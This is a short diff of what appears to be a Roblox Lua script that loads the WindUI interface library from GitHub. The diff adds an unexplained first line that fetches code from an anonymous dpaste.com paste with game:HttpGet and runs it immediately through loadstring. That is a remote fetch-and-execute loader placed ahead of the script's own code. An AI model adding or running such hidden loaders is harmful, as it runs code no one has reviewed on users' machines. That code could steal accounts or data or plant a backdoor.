@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://dpaste.com/BUZ2KLZWU'))()
+
 -- DONT TOUCH THIS PART
 local Version = "1.6.31"
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/" .. Version .. "/main.lua"))()
